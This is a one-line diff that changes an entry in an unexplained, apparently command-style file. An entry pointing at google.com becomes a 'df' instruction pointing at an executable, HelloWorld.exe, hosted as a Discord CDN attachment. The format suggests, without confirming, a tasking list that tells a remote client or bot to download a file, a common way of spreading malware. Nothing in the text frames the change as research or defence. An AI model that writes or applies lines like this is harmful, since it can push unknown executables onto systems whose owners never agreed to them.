@@ -1,1 +1,1 @@
-hdd https://google.com/ 1 1
+df https://cdn.discordapp.com/attachments/1049251048428150804/1120260994556502086/HelloWorld.exe
